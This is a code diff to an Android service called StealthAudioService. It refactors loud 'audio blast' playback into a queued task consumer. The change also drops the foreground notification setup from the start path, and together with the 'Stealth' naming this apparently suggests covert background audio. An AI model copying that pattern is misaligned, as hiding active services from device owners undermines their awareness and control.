@@ -68,7 +68,10 @@ public class StealthAudioService extends Service {
 
     @Override
     public void onDestroy() {
-        log("StealthAudioService destroyed, interrupting active operation tracks.");
+        log("StealthAudioService destroyed, stopping queue consumer");
+        PlaybackQueue.stopConsumer();
+        PlaybackQueue.clearAll();
+        
         synchronized (threadLock) {
             if (playbackThread != null && playbackThread.isAlive()) {
                 playbackThread.interrupt();
@@ -94,12 +97,9 @@ public class StealthAudioService extends Service {
     }
 
     private void stopAudio() {
-        synchronized (threadLock) {
-            if (playbackThread != null && playbackThread.isAlive()) {
-                playbackThread.interrupt();
-            }
-        }
-        StealthAudio.stopPlayback();
+        log("Stopping audio playback");
+        PlaybackQueue.stopConsumer();
+        PlaybackQueue.clearAll();
         reportAudioEvent(0, "audio_done");
         stopForeground(true);
         stopSelf();
@@ -144,47 +144,18 @@ public class StealthAudioService extends Service {
     }
 
     private void startAudio(int type, float volume, int loops) {
-        ensureNotificationChannel();
-        Notification notif = buildNotification();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForegroundWithType(notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
+        log("Audio start request: type=" + type + " volume=" + volume + " loops=" + loops);
+        
+        // NEW: Enqueue task instead of playing directly
+        PlaybackTask task = PlaybackQueue.enqueueTask(0L, type, volume, loops);
+        
+        if (task != null) {
+            log("Task enqueued: " + task.taskId + ". Queue size: " + PlaybackQueue.getQueueSize());
+            // Ensure consumer is running
+            PlaybackQueue.startConsumer(this);
         } else {
-            startForeground(NOTIF_ID, notif);
-        }
-
-        log("Starting foreground audio blast: type=" + type + " vol=" + volume + " loops=" + loops);
-
-        synchronized (threadLock) {
-            if (playbackThread != null && playbackThread.isAlive()) {
-                playbackThread.interrupt();
-                try {
-                    playbackThread.join(500);
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                }
-            }
-
-            final int   finalType  = type;
-            final float finalVol   = volume;
-            final int   finalLoops = loops;
-
-            playbackThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        reportAudioEvent(finalType, "audio_started");
-                        StealthAudio.playSound(getApplicationContext(), finalType, finalVol, finalLoops);
-                        log("Audio blast finished: type=" + finalType);
-                    } catch (Exception e) {
-                        logError(getApplicationContext(), "Playback exception type=" + finalType, e);
-                    } finally {
-                        reportAudioEvent(finalType, "audio_done");
-                        stopSelf();
-                    }
-                }
-            });
-            playbackThread.setName("sa-playback-" + type);
-            playbackThread.start();
+            logError(this, "Failed to enqueue task - queue full", null);
+            stopSelf();
         }
     }
 
